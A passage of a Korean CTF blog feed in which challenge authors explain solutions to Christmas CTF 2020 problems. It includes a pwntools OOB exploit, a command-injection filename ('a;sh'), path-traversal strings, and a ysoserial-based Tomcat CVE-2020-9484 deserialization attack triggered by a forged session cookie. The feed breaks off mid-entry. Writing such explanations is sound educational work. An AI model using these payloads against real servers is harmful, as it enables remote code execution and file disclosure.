    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file access입니다. 파일을 Cache 할 때 해당 파일의 이름을 해쉬 해야 하지만 Firefox Fennec v68.9.0의 <code>content:// URI</code> 로직엔 존재하지 않기 때문에 Arbitrary local file access가 발생합니다. 이런 상황을 pwnable 문제로 구현해봤는데…</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png"></p><p>unintended solution으로 커멘드 인젝션이 존재합니다. 상위권 솔브가 모두 커멘드 인젝션이더군요… 하하하. 문제 검수 단계에서 커멘드 인젝션에 대한 말이 나와서 수정하고 검증까지 했는데 수정 안된 버전이 대회 때 올라갔네요.</p><p>oil-system 문제를 풀어주신 분들께 정말 죄송합니다. 조금 더 철저하게 준비했어야 됐는데…</p><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png"></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png"></p><p>문제 바이너리는 subleq이라는 One-Instruction-Language system 에뮬레이터입니다. subleq 코드를 담고 있는 파일에서 데이터를 읽어와 스택에 저장하고 그 코드를 해석해 동작합니다. subleq코드를 해석하는 함수에 OOB 취약점이 존재해 리턴 값을 조작할 수 있습니다. subleq 코드를 담고 있는 파일을 cache 하는 루틴도 존재하는데 파일의 경로만 바뀔 뿐 파일명을 유지합니다. Write Code 기능으로 flag라는 파일을 생성하고 실제 flag파일이 cache 되도록 리턴 값을 유도하면 됩니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png"></p><p>위 사진은 함수 subleq()의 코드입니다. a2의 index로 사용되는 v4와 v5의 최댓값이 존재하지 않기 때문에 oob write가 가능합니다. v4와 v5값를 이용해 a2보다 높은 주소에 있는 스택 어디든 참조할 수 있게 되고 리턴 값을 오염시킬 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Enter your Program\&#x27;s Name : &#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Enter Code : &#x27;</span>,<span class="hljs-string">&#x27;4 166 -1 -1 -1054&#x27;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125; ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png"></p><p>파일명 필터 함수입니다. 파일명에 영문 소문자 이외의 입력이 들어온다면 프로세스를 종료합니다. 안타깝게도 유심히 보시면 첫 글자만 검사한다는 것을 알 수 있습니다. <s>문제 만든 놈이 픵신인듯</s></p><pre><code class="hljs plain"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&#39;s Name : a;sh Enter Code : your an idiot &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125;$</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>oob</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - angrforge</title>
    <link href="/2020/12/29/idioth/christmasctf2020-angrforge/"/>
    <url>/2020/12/29/idioth/christmasctf2020-angrforge/</url>
    
    <content type="html"><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>angr를 통해 입력 값을 뽑아내는 것이 의도인 문제였습니다. 이 문제는 여러 번의 수정을 거쳤습니다. 원래 이 문제도 arm 환경에서 angr를 돌리는 문제로 낼 예정이었는데 arm에서 제대로 동작하지 않아서 arm은 포기. 그리고 원래 처음에는 c++로 냈었는데 검수 후 수정을 했더니 simulation manager를 돌려도 값이 제대로 나오지 않아서 c로 옮기는 과정에서 연산 몇 개를 뺐습니다..ㅠ</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ file angrforge<span class="hljs-attribute">angrforge</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked,<span class="hljs-attribute">interpreter</span> /lib<span class="hljs-number">64</span>/ld-linux-x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>,<span class="hljs-attribute">BuildID</span>[sha<span class="hljs-number">1</span>]=<span class="hljs-number">1162</span>ed<span class="hljs-number">229</span>a<span class="hljs-number">12133</span>d<span class="hljs-number">07</span>de<span class="hljs-number">26301</span>dad<span class="hljs-number">1</span>ada<span class="hljs-number">34</span>a<span class="hljs-number">9</span>c<span class="hljs-number">3</span>ff, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, stripped</code></pre><p>64bit ELF 파일이며, stripped 되어있습니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00103be1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  undefined8 local_58;  undefined8 local_50;  undefined8 local_48;  undefined8 local_40;  undefined8 local_38;  undefined8 local_30;  undefined8 local_28;  undefined local_20;  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  local_58 = <span class="hljs-number">0</span>;  local_50 = <span class="hljs-number">0</span>;  local_48 = <span class="hljs-number">0</span>;  local_40 = <span class="hljs-number">0</span>;  local_38 = <span class="hljs-number">0</span>;  local_30 = <span class="hljs-number">0</span>;  local_28 = <span class="hljs-number">0</span>;  local_20 = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;General Angerforge, the Dark Iron responsible for stealing my computer.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But I\&#x27;m just a programmer.. so Call me my best warrior friend.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you call my friend, I will give you a good reward.&quot;</span>);  fgets((<span class="hljs-keyword">char</span> *)&amp;local_58,<span class="hljs-number">0x39</span>,<span class="hljs-built_in">stdin</span>);  FUN_00103a48(&amp;local_58);  iVar1 = FUN_001039f7(&amp;local_58);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG, Thank you for your good works :)&quot;</span>);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001039d9();  &#125;  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>    __stack_chk_fail();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ghidra를 통해 디컴파일을 한 후 main을 확인해보면, <code>0x39(57)</code>만큼의 입력 값을 받아서 <code>FUN_00103a48</code>을 호출하고, <code>FUN_001039f7</code>을 통해 문자열을 체크하는 것을 확인할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00103a48</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  <span class="hljs-keyword">if</span> (sVar1 &lt; (ulong)(<span class="hljs-keyword">long</span>)(<span class="hljs-keyword">int</span>)((DAT_00106014 | DAT_00106010) + <span class="hljs-number">5</span>)) &#123;    FUN_001033e9(param_1);    FUN_00103481(param_1);    FUN_00103519(param_1);    FUN_001035b1(param_1);    FUN_00103649(param_1);    FUN_001036e1(param_1);    FUN_00103779(param_1);    FUN_00103811(param_1);    FUN_001038a9(param_1);    FUN_00103941(param_1);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001011c9(param_1);    FUN_00101396(param_1);    FUN_00101563(param_1);    FUN_00101730(param_1);    FUN_001018fd(param_1);    FUN_00101abf(param_1);    FUN_00101bbf(param_1);    FUN_00101cce(param_1);    FUN_00101dce(param_1);    FUN_00101eee(param_1);    FUN_001022cb(param_1);    FUN_00102589(param_1);    FUN_00102847(param_1);    FUN_00102b05(param_1);    FUN_00102dc3(param_1);    FUN_00102ef9(param_1);    FUN_00103035(param_1);    FUN_00103171(param_1);    FUN_001032ad(param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>FUN_00103a48</code> 함수는 입력 값을 받아서, 길이에 따라서 여러 가지 다른 sub 함수를 수행합니다. 각 sub 함수의 연산은 서로 다른 바이트에 영향을 미치지 않고 함수가 다른 함수를 호출하는 로직도 있어서 상당히 복잡하게 얽혀있습니다. c++에는 곱 연산 같은 것도 넣었는데 c로 급하게 옮기면서 보니 바이트가 증발하더군요..ㅠ <del>시간 부족으로 인한 역 연산 가능 로직</del></p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_001039f7</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> local_c;    local_c = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x37</span> &lt; local_c) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">char</span> *)(param_1 + local_c) != (&amp;DAT_00104080)[local_c]) <span class="hljs-keyword">break</span>;    local_c = local_c + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>FUN_001039f7</code>에서는 0x38만큼 <code>DAT_00104080</code>과 값을 비교하여 맞으면 <code>1</code>, 아닐 시 <code>0</code>을 리턴해줍니다.</p><p><code>\n</code>을 제외한 문자열의 길이는 56이고, <code>stdin</code>을 통해 입력 값이 들어가므로 입력 값 56과 <code>stdin</code>을 처리하는 state를 구성하여 simulation manager를 돌리면 값을 구할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripyp = angr.Project(<span class="hljs-string">&#x27;./angrforge&#x27;</span>)flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">56</span>)]flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])st = p.factory.full_init_state(    stdin = flag,    add_options = angr.options.unicorn,)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_chars:    st.solver.add(i != <span class="hljs-number">0</span>)    st.solver.add(i != <span class="hljs-number">10</span>)sm = p.factory.simulation_manager(st)sm.run()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sm.deadended:    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;OMG&#x27;</span> <span class="hljs-keyword">in</span> i.posix.dumps(<span class="hljs-number">1</span>):        print(i.posix.dumps(<span class="hljs-number">0</span>))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ python<span class="hljs-number">3</span> solve.py<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">44</span>,<span class="hljs-number">086</span> | cle.loader | The main binary is a position-independent executable.<span class="hljs-attribute">It</span> is being loaded with a base address of <span class="hljs-number">0</span>x<span class="hljs-number">400000</span>.<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">45</span>,<span class="hljs-number">089</span> | angr.simos.simos | stdin is constrained to <span class="hljs-number">57</span> bytes (has_end=True).<span class="hljs-attribute">If</span> you are only providing the first <span class="hljs-number">57</span> bytes instead of the entire stdin,<span class="hljs-attribute">please</span> use stdin=SimFileStream(name=&#x27;stdin&#x27;, content=your_first_n_bytes, has_end=False).<span class="hljs-attribute">b</span>&#x27;XMAS&#123;h<span class="hljs-number">3</span>_<span class="hljs-number">1</span>s_b<span class="hljs-number">1</span>o<span class="hljs-number">0</span>d<span class="hljs-number">3</span>lf_d<span class="hljs-number">3</span>athkni<span class="hljs-number">9</span>ht_wh<span class="hljs-number">0</span>_will_kill_<span class="hljs-number">4</span>ngrf<span class="hljs-number">0</span>rge&#125;\n&#x27;</code></pre><p>Flag : XMAS{h3_1s_b1o0d3lf_d3athkni9ht_wh0_will_kill_4ngrf0rge}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>christmas ctf 2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - gift</title>
    <link href="/2020/12/29/idioth/christmasctf2020-gift/"/>
    <url>/2020/12/29/idioth/christmasctf2020-gift/</url>
    
    <content type="html"><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니다. 문제를 만들면서 이 취약점이 있는 서비스를 만들고 싶은데… 만약 이런 사이트가 있었다면 어떤 식으로 취약점에 접근할 수 있을까?라는 생각을 하면서 만들었습니다.</p><p>session이 저장되는 위치와 자신이 올린 파일이 업로드되는 위치를 모두 알아야 하고 또 해당 취약점에 취약한 버전이라는 것도 알아야 해서 local에 있는 파일을 모두 볼 수 있으면 되겠다는 생각을 했습니다. <del>lock과 angrforge의 허술함은 여기에서 왔다.</del></p><p>RCE를 활용해야 한다는 것과 실행할 파일의 위치를 <code>special.jsp</code>에 넣어놨는데 좀 더 잘 보이는 곳에 넣어둘 걸… 하는 생각을 했습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg"></p><p>제가 웹 알못이다 보니 이런저런 것을 구현할 때 주위의 웹 하는 친구들한테 물어보며 이거 이러이러하게 해서 플래그에 접근하는 건데 게싱이 심하지 않을까? 사람들이 이런 식으로 접근할 수 있을까? 내가 이거 어떻게 하는지 잘 몰라서 이렇게 해봤는데 괜찮을까? 물어보면서 만들었습니다. <del>일단 있는 거 다 해보고 파일은 다 찾아본다며</del></p><p>구현을 도와준다던 놈들은 jsp라고 하니까 다 도망가더군요 하하하… 잡설이 길었습니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png"></p><p>메인 화면입니다. 저기 깃발(flag) 모양에 Special gift가 숨겨져 있다!라고 되어있습니다. 이걸 description에 적어놨으면 참 좋았을걸 왜 안 적어놨지? 일단 로그인을 해야 기능을 볼 수 있는 것 같으니 로그인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png"></p><p>로그인을 하면 제공하는 기능을 볼 수 있습니다. 사이트에서 제공하는 기능을 정리하면 아래와 같습니다.</p><ul><li><code>Gift List</code><ul><li>전송한 선물의 리스트를 볼 수 있다.</li><li>file name을 <code>GET</code>을 통해 받는다.</li></ul></li><li><code>Send List</code><ul><li>선물을 전송할 수 있다.</li></ul></li><li><code>Community</code><ul><li>게시판 기능으로 글을 작성할 수 있다.</li></ul></li></ul><p>선물을 전송하면 산타가 그 선물을 준다고 하고 gift list에서 올린 선물 리스트의 내용을 확인할 수 있으니 일단 <code>Send List</code>를 통해 선물을 전송하고 난 후 <code>Gift List</code>에서 어떠한 식으로 확인할 수 있는지를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png"></p><p>txt 파일과 자신들의 secret한 파일만 올릴 수 있다고 하니 일단 txt 파일을 올려봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png"></p><p>전송이 완료된 후 <code>Gift List</code>를 통해 파일 리스트를 확인하면 <code>&lt;name&gt;</code>‘s gift list라는 제목과 함께 업로드한 파일이 표시가 되고 해당 파일의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png"></p><p>gift list를 불러올 때 사용되는 <code>&lt;name&gt;</code>은 <code>GET</code>을 통해 불러오는 것으로 추정되므로 해당 인자 값을 수정해봅니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png"></p><p>name을 변경하자 testa’s gift list를 읽어오고 아무것도 출력이 안 되는 것을 볼 수 있습니다.</p><p>name에 따라 다른 디렉터리를 생성하고 해당 폴더에 파일이 올라간다는 가설을 세우고 path traversal이 가능한지 확인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png"></p><p>name에 <code>.</code>을 입력하자 아까 위에서 확인한 두 개의 폴더가 나옵니다. 더 위로 올라가 봅시다.</p><p><code>../</code>나 <code>....//</code>은 필터링이 되어 있어 디렉터리 리스팅이 불가능하지만 <code>..././</code>은 가능합니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png"></p><p>해당 폴더에 진입하면 gift 폴더 안에서 username으로 gift list가 관리되고 있음을 알 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png"></p><p>한 번 더 올라가면 이러한 디렉터리가 보입니다. tomcat의 상위 디렉터리인데 이를 통해 tomcat을 통해 구동되고 있음을 확인할 수 있습니다. 먼저 웹페이지 소스코드 파일은 webapps에 들어있으므로 해당 디렉터리를 들어가서 어떠한 파일이 있는지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image10.png"></p><p><code>special.jsp</code>라는 파일이 있네요. 메인에서 special gift가 숨겨져 있다고 했으니 해당 jsp를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png"></p><p><code>special_gift</code> 파일을 찾아서 실행하면 이 디렉터리에서 특별한 선물을 볼 수 있다고 합니다.</p><p>tomcat 디렉터리로 가서 RELEASE-NOTES의 내용을 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png"></p><p>tomcat-8.5.54 버전에서 동작하고 있습니다. 해당 버전은 CVE-2020-9484 버전에 영향을 받는 버전이고 해당 취약점에 영향을 받는지 확인하는 방법은 아래와 같습니다.</p><ul><li>tomcat이 session을 PersistenceManager를 통해 세션을 관리함</li><li>FileStore를 통해 Directory 경로를 지정함</li><li>arbitrary file upload가 가능하며 해당 파일이 어디에 저장되는지 알 수 있음</li></ul><p>현재 arbitrary file upload가 가능하며 파일이 업로드되는 위치도 알 수 있으므로 <code>conf/context.xml</code>을 통해 PersistenceManager를 사용 중인지, 사용 중이라면 FileStore로 Directory를 지정해서 저장하는지, 저장한다면 session이 저장되는 경로는 어딘지 확인합시다.(아까 위에서 sessions 폴더를 본 것 같긴 한데)</p><p><code>detail.jsp?file=..././..././..././conf/context.xml</code>로 접근하면 <code>conf/context.xml</code>의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png"></p><p>PersistentManager, FileStore를 사용하며 session이 저장되는 경로는 <code>/usr/local/tomcat/sessions</code>네요.</p><p>해당 취약점은 session을 deserialize 하면서 일어나는 취약점이므로 gadget도 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png"></p><p><code>/lib</code> 폴더에 <code>groovy-2.3.9.jar</code> 가 존재하는 것을 알 수 있습니다.</p><p>이제 <code>special_gift</code> 파일의 위치를 찾아보면</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png"></p><p>최상위 경로에 있는 것을 볼 수 있습니다.(이것도 위치를 알려줬어야…ㅠㅠ) 이제 해당 취약점을 활용하여 <code>special_gift</code> 바이너리를 실행하면 <code>/webapps/ROOT</code> 에 flag 파일이 생성될 것입니다.</p><p>그전에 해당 취약점을 활용하는 것이 맞는지 upload.jsp의 내용으로 올릴 수 있는 special file이 session 파일인지 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png"></p><p>허용되어있는 확장자가 <code>.txt</code>와 <code>.session</code>파일임을 알 수 있습니다!</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png"></p><p>흠.. 일단 exploit 과정을 정리하면 다음과 같습니다.</p><ul><li>file이 업로드되는 경로는 <code>tomcat/media/gift/&lt;name&gt;</code>이다.</li><li>sessions이 저장되는 경로는 <code>tomcat/sessions</code>이다.</li><li><code>special.jsp</code> 에 따르면 <code>/special_gift</code>를 실행하면 flag 파일이 생성된다.</li><li><code>/bin/bash -c /special_gift</code>를 수행하면 <code>special_gift</code> 파일이 실행되고 flag를 확인할 수 있다.</li><li>serialize session 생성</li></ul><pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span><span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred<span class="hljs-built_in">WARNING</span>: Illegal reflective <span class="hljs-keyword">access</span> <span class="hljs-keyword">by</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span> (file:/home/idioth/ysoserial.jar) <span class="hljs-keyword">to</span> <span class="hljs-keyword">method</span> java.lang.<span class="hljs-keyword">Object</span>.finalize()<span class="hljs-built_in">WARNING</span>: Please consider reporting this <span class="hljs-keyword">to</span> the maintainers <span class="hljs-keyword">of</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span><span class="hljs-built_in">WARNING</span>: Use <span class="hljs-comment">--illegal-access=warn to enable warnings of further illegal reflective access operations</span><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre><ul><li>해당 session file으로 접근</li></ul><pre><code class="hljs xml">idioth@ubuntu:~$ curl &#x27;http://192.168.48.128/index.jsp&#x27; -H &#x27;Cookie:JSESSIONID=../media/gift/test/exploit&#x27;<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;&#125; <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> &#123;<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;&#125; <span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;&#125; <span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;&#125; <span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125; <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;&#125; <span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">color</span>:black;&#125; <span class="hljs-selector-class">.line</span> &#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png"></p><p>XMAS{0mg_u_f1nd_a_sp3cia1_g1ft!!}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>web</tag>
      
      <tag>lfi</tag>
      
      <tag>cve-2020-9484</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - lock</title>
    <link href="/2020/12/29/idioth/christmasctf2020-lock/"/>
    <url>/2020/12/29/idioth/christmasctf2020-lock/</url>
    
    <content type="html"><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>baby_crackme를 하나 간단하게 내고 싶었는데 arm으로 내면 어떨까? 싶어서 낸 문제입니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>dump로 파일이 하나 주어지며 vscode나 메모장 등으로 열면 아래와 같은 dump 코드가 나옵니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-lock/image0.png"></p><p>aarch64에서 동작하는 바이너리이며 Input 값을 통해 어떠한 연산을 수행하는 것으로 볼 수 있습니다.</p><pre><code class="hljs llvm"><span class="hljs-number">0000000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span> &lt;main&gt;: <span class="hljs-keyword">c</span><span class="hljs-number">50</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp, #<span class="hljs-number">-32</span>]! <span class="hljs-keyword">c</span><span class="hljs-number">54</span>:   <span class="hljs-number">910003</span>fd    mov <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, sp <span class="hljs-keyword">c</span><span class="hljs-number">58</span>:   d<span class="hljs-number">2800021</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, <span class="hljs-symbol">#0</span><span 